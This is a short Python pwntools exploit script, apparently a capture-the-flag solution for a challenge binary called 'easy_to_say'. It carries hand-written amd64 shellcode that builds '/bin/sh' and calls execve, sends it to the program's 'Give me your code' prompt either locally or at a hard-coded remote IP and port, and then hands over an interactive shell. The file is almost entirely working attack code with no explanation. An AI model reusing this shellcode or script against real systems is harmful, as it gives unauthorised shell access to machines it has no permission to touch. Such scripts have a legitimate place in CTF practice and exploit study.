import pwn
import pwnlib

pwn.context.clear(arch='amd64')
pwn.context.terminal = ['tmux', 'splitw', '-h']

shellcode = "\xB3\x02\x49\xBC\x2D\x62\x69\x6E\x2F\x73\x68\x00\x4C\x01\xE3\x53\x48\x8D\x3C\x24\xB0\x3B\x0F\x05"


if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('52.69.40.204', 8361)
    else:
        p = pwn.process('./easy_to_say-c7dd6cdf484305f7aaac4fa821796871')

    print repr(shellcode)

    p.sendafter('Give me your code :', shellcode)
    p.interactive()
